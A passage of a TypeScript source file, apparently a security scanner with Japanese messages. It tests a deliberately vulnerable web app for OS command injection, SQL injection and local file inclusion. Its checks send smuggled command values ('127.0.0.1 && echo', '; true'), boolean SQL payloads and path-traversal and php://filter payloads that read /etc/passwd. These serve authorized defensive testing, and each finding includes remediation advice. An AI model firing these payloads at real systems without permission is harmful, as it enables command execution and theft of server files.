        evidence: `POST /vulnerabilities/api/v2/health/connectivity（target=127.0.0.1 && echo SP${marker}）の応答に実行結果 SP${marker} が含まれることを確認。`,
        remediation:
          '外部コマンドへ利用者入力を連結しないでください。IPアドレス等は厳密な形式検証（ホワイトリスト）を行い、コマンド実行の必要がある場合は引数配列での exec 系APIを使用してください。',
        limitations: '実行確認には無害な echo（マーカー出力）のみを使用しています。',
      });
      return;
    }
  }
  // 戦略2: 実行結果を返さない実装では、注入コマンドの終了コードが応答ステータスへ反映されるかを確認する。
  const probe = async (target: string): Promise<string | undefined> => {
    const response = await postJson(ctx, 'vulnerabilities/api/v2/health/connectivity', `{"target": "${target}"}`);
    if (response.status !== 200 && response.status !== 500) {
      return undefined;
    }
    return `HTTP ${String(response.status)}: ${truncate(response.body, 60).replace(/\s+/g, ' ')}`;
  };
  const baseline = await probe('scopepilot-probe.invalid');
  const withTrue = await probe(renderPayload(payloadById(WORKFLOW_PAYLOAD_CATALOG, 'command.posix.and.true'), {}));
  const withFalse = await probe(renderPayload(payloadById(WORKFLOW_PAYLOAD_CATALOG, 'command.posix.and.false'), {}));
  if (withTrue !== undefined && withFalse !== undefined && withTrue !== withFalse && withTrue !== baseline) {
    detect(check, {
      description:
        '接続確認APIが target の値を検証せずに ping コマンドへ連結して実行しています。注入したコマンド（true / false）の終了コードに応じて応答が変化することを確認でき、任意のOSコマンドが実行可能です。',
      evidence: `POST（target=127.0.0.1; true）→ 応答「${withTrue}」、（target=127.0.0.1; false）→ 応答「${withFalse}」、比較基準（到達不能ホスト指定）→「${baseline ?? '不明'}」。注入コマンドの終了コードが応答へ反映されました（マーカー ${marker}）。`,
      remediation:
        '外部コマンドへ利用者入力を連結しないでください。IPアドレス等は厳密な形式検証（ホワイトリスト）を行い、コマンド実行の必要がある場合は引数配列での exec 系APIを使用してください。',
      limitations: '実行確認には無害な true / false コマンドのみを使用しています。',
    });
    return;
  }
  skip(check, 'コマンド実行の証拠を取得できず');
}

/** SQLインジェクションのURL単位成立確認 (CWE-89)。 */
export async function runSqliVerificationCheck(ctx: CheckContext): Promise<void> {
  const targets: readonly { path: string; name: string }[] = [
    { path: 'vulnerabilities/sqli/', name: '通常型SQLインジェクション' },
    { path: 'vulnerabilities/sqli_blind/', name: 'ブラインドSQLインジェクション' },
  ];
  for (const target of targets) {
    const check = beginCheck(ctx, {
      checkId: 'sqli-verify',
      title: `${target.name}：URL単位の成立確認${levelSuffix(ctx.securityLevel)}`,
      category: '入力値検証',
      severity: 'high',
      cwe: '89',
      url: urlOf(ctx, target.path),
      method: 'GET',
      param: 'id',
    });
    if (!(await reachable(ctx, target.path))) {
      skip(check, '対象画面へ到達できず');
      continue;
    }
    // 引用符を要するペイロード（low）と数値のみのペイロード（medium のエスケープ対策）を、
    // GETとPOSTの両方で試す（難易度によってフォームのmethodが変わる）。
    const booleanPairs = [
      ['sqli.boolean.quoted.true', 'sqli.boolean.quoted.false'],
      ['sqli.boolean.numeric.true', 'sqli.boolean.numeric.false'],
    ] as const;
    let trueHasRow = false;
    let falseHasRow = true;
    for (const [truthId, falseId] of booleanPairs) {
      const truthPayload = renderPayload(payloadById(WORKFLOW_PAYLOAD_CATALOG, truthId), {});
      const falsePayload = renderPayload(payloadById(WORKFLOW_PAYLOAD_CATALOG, falseId), {});
      for (const usePost of [false, true]) {
        const truth = usePost
          ? await postForm(ctx, target.path, { id: truthPayload, Submit: 'Submit' })
          : await get(ctx, `${target.path}?id=${encodeURIComponent(truthPayload)}&Submit=Submit`);
        const lie = usePost
          ? await postForm(ctx, target.path, { id: falsePayload, Submit: 'Submit' })
          : await get(ctx, `${target.path}?id=${encodeURIComponent(falsePayload)}&Submit=Submit`);
        const truthRow = hasResultRow(truth.body);
        const lieRow = hasResultRow(lie.body);
        if (truthRow && !lieRow) {
          trueHasRow = true;
          falseHasRow = false;
          break;
        }
        if (truthRow) {
          trueHasRow = true;
          falseHasRow = lieRow;
        }
      }
      if (trueHasRow && !falseHasRow) {
        break;
      }
    }
    const errorProbe = await get(ctx, `${target.path}?id=1%27&Submit=Submit`);
    const hasSqlError = /SQL syntax|mysqli_|mysql_fetch|SQLSTATE|syntax error/i.test(errorProbe.body);
    if ((trueHasRow && !falseHasRow) || hasSqlError) {
      const method =
        trueHasRow && !falseHasRow ? '真偽クエリで応答差（真: 結果行あり / 偽: 結果行なし）' : 'エラーメッセージ（SQL構文エラー）の露出';
      detect(check, {
        description: `${target.path} の id パラメーターがSQL文へ直接連結されています。${
          trueHasRow && !falseHasRow ? 'AND 条件の真偽によって応答の結果行が変化するため、ブラインド手法でデータベース内の任意情報を窃取できます。' : '不正なクォートでSQLエラーが露出するため、構造を特定した攻撃が可能です。'
        }`,
        evidence: `${method}。GET ${target.path}?id=1' AND '1'='1 → 結果行${trueHasRow ? 'あり' : 'なし'}、?id=1' AND '1'='2 → 結果行${falseHasRow ? 'あり' : 'なし'}、?id=1' → ${hasSqlError ? 'SQLエラー露出' : 'エラーなし'}（マーカー ${ctx.marker}）。`,
        remediation: 'SQL文はプリペアドステートメント（パラメーター化クエスト）で組み立て、利用者入力を文字列連結しないでください。エラーメッセージの詳細を応答へ出さないでください。',
      });
    } else {
      skip(check, 'このURLでは成立を確認できず');
    }
  }
}

/** ローカルファイルインクルージョン (CWE-98/22)。 */
export async function runLfiCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'lfi',
    title: `ローカルファイルインクルージョン（サーバー内ファイルの読取り）${levelSuffix(ctx.securityLevel)}`,
    category: 'ファイルアクセス',
    severity: 'high',
    cwe: '98',
    url: urlOf(ctx, 'vulnerabilities/fi/'),
    method: 'GET',
    param: 'page',
  });
  if (!(await reachable(ctx, 'vulnerabilities/fi/'))) {
    skip(check, '対象画面へ到達できず');
    return;
  }
  const payloads = [
    '/etc/passwd',
    '../../../../../../../etc/passwd',
    '....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd',
    'php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd',
    'file:///etc/passwd',
  ];
  for (const payload of payloads) {
    const response = await get(ctx, `vulnerabilities/fi/?page=${encodeURIComponent(payload)}`);
    const leaked =
      (response.body.includes('root:') && /root:.{0,4}0:0:/.test(response.body)) || tryDecodePasswd(response.body);
    if (leaked) {
      detect(check, {
        description:
          'page パラメーターで指定されたファイルが検証なしに読み込まれ（include）、サーバー内の/etc/passwd の内容が応答へ現れました。設定ファイル・ソースコード等の任意ファイル読取りに利用でき、アップロード機能との連鎖でコード実行につながります。',
        evidence: `GET /vulnerabilities/fi/?page=${encodeURIComponent(truncate(payload, 60))} の応答に /etc/passwd の内容（root:x:0:0:… 相当）を確認（マーカー ${ctx.marker}）。`,
        remediation: '読み込み対象は固定の許可リスト（マップ）で解決し、パス区切り・ストリームラッパー（php:// 等）を含む入力を拒否してください。include先は静的に定義してください。',
      });
      return;
    }
  }
  skip(check, 'サーバー内ファイルの読取りを確認できず');
}

function tryDecodePasswd(body: string): boolean {
  const match = /([A-Za-z0-9+/=]{80,})/.exec(body);
  if (match?.[1] === undefined) {
    return false;
  }
  try {
    const decoded = Buffer.from(match[1], 'base64').toString('utf8');
    return decoded.includes('root:') && /root:.{0,4}0:0:/.test(decoded);
  } catch {
    return false;
  }
}

function levelSuffix(level: string): string {
  return level === '' ? '' : `（検証レベル: ${level}）`;
}

// ---------------------------------------------------------------------------
// オーケストレーション
// ---------------------------------------------------------------------------

const LEVEL_SCOPED_CHECKS: readonly { readonly id: WorkflowScanCheckId; readonly run: (ctx: CheckContext, options: WorkflowScanOptions) => Promise<void> }[] = [
  { id: 'csrf-password', run: (ctx, options) => runCsrfCheck(ctx, options.password) },
  { id: 'file-upload', run: runFileUploadCheck },
  { id: 'captcha-bypass', run: (ctx, options) => runCaptchaBypassCheck(ctx, options.password) },
  { id: 'weak-session', run: runWeakSessionCheck },
  { id: 'xss-reflected', run: runXssReflectedCheck },
  { id: 'xss-stored', run: runXssStoredCheck },
  { id: 'csp-bypass', run: runCspBypassCheck },
  { id: 'client-side-token', run: runClientSideTokenCheck },
  { id: 'xss-dom', run: runXssDomCheck },
  { id: 'authorization-bypass', run: runAuthorizationBypassCheck },
  { id: 'bac-open-access', run: runBacOpenAccessCheck },
  { id: 'crypto-xor', run: runCryptoXorCheck },
  { id: 'crypto-ecb', run: runCryptoEcbCheck },
  { id: 'crypto-cbc-oracle', run: runCryptoCbcOracleCheck },
  { id: 'sqli-verify', run: runSqliVerificationCheck },
  { id: 'lfi', run: runLfiCheck },
];

const ONCE_CHECKS: readonly { readonly id: WorkflowScanCheckId; readonly run: (ctx: CheckContext) => Promise<void> }[] = [
  { id: 'brute-force', run: runBruteForceCheck },
  { id: 'xss-dom', run: runXssDomScriptsCheck },
  { id: 'open-redirect', run: runOpenRedirectCheck },
  { id: 'api-legacy', run: runApiLegacyCheck },
  { id: 'api-mass-assignment', run: runApiMassAssignmentCheck },
  { id: 'api-command-injection', run: runApiCommandInjectionCheck },
];

/**
 * ワークフロー診断を実行する。ログイン後、security.php でセキュリティレベルを
 * low → medium → high へ切替えながら各チェックを実施し、終了後に元のレベルへ戻す。
 * パスワード・権限を変更する検証は実施後に元の値へ復元する。
 */
export async function runWorkflowScan(
  options: WorkflowScanOptions,
  transport: WorkflowScanTransport,
  hooks: WorkflowScanHooks = {},
): Promise<WorkflowScanRunResult> {
  const maxRequests = options.maxRequests ?? WORKFLOW_SCAN_DEFAULT_MAX_REQUESTS;
  const progress = hooks.progress ?? ((): void => undefined);
  const startedAt = new Date().toISOString();
  const marker = `sp${Array.from({ length: 12 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`;
  const levels = options.securityLevels ?? ['low', 'medium', 'high'];
  const enabledChecks = new Set(options.checkIds === undefined || options.checkIds.length === 0 ? ALL_WORKFLOW_CHECKS : options.checkIds);
  const passwordVerifier =
    hooks.createProbeTransport === undefined
      ? undefined
      : (password: string): Promise<boolean> =>
          workflowScanLogin(hooks.createProbeTransport!(), options.username, password, (): void => undefined);
  const result: {
    checks: WorkflowScanCheckResult[];
    skips: WorkflowScanSkipNote[];
  } = { checks: [], skips: [] };
  let authenticated = false;
  let originalSecurityLevel = '';
  try {
    progress('ログインを試みます。');
    authenticated = await workflowScanLogin(transport, options.username, options.password, progress);
    originalSecurityLevel = await readSecurityLevel(transport);
    progress(`現在のセキュリティレベル: ${originalSecurityLevel === '' ? '不明' : originalSecurityLevel}`);
    for (const level of levels) {
      throwIfAborted(options.signal);
      progress(`セキュリティレベル ${level} でチェックを実行します。`);
      await setSecurityLevel(transport, level);
      const ctx: CheckContext = {
        transport,
        marker,
        securityLevel: level,
        progress,
        signal: options.signal,
        results: result.checks,
        skips: result.skips,
        passwordVerifier,
      };
      for (const check of LEVEL_SCOPED_CHECKS) {
        if (!enabledChecks.has(check.id)) continue;
        throwIfAborted(options.signal);
        if (transport.requestCount >= maxRequests) {
          throw domainError('OutOfScope', `ワークフロー診断のリクエスト上限（${String(maxRequests)}件）に達しました。`);
        }
        await check.run(ctx, options);
      }
    }
    const once: CheckContext = {
      transport,
      marker,
      securityLevel: '',
      progress,
      signal: options.signal,
      results: result.checks,
      skips: result.skips,
      passwordVerifier,
    };
    for (const check of ONCE_CHECKS) {
      if (!enabledChecks.has(check.id)) continue;
      throwIfAborted(options.signal);
      if (transport.requestCount >= maxRequests) {
        throw domainError('OutOfScope', `ワークフロー診断のリクエスト上限（${String(maxRequests)}件）に達しました。`);
      }
      await check.run(once);
    }
  } finally {
    // 対象のセキュリティレベルを元へ戻す。
    if (originalSecurityLevel !== '') {
      try {
        await setSecurityLevel(transport, originalSecurityLevel);
      } catch {
        // 復元失敗は診断結果には影響しないため記録のみ行う。
      }
    }
  }
  return {
    baseUrl: transport.baseUrl,
    authenticated,
    originalSecurityLevel,
    testedSecurityLevels: levels,
    requestCount: transport.requestCount,
    startedAt,
    endedAt: new Date().toISOString(),
    payloadSet: WORKFLOW_SCAN_PAYLOAD_SET,
    checks: result.checks,
    skips: result.skips,
    requestLog: transport.takeRequestLog(),
  };
}
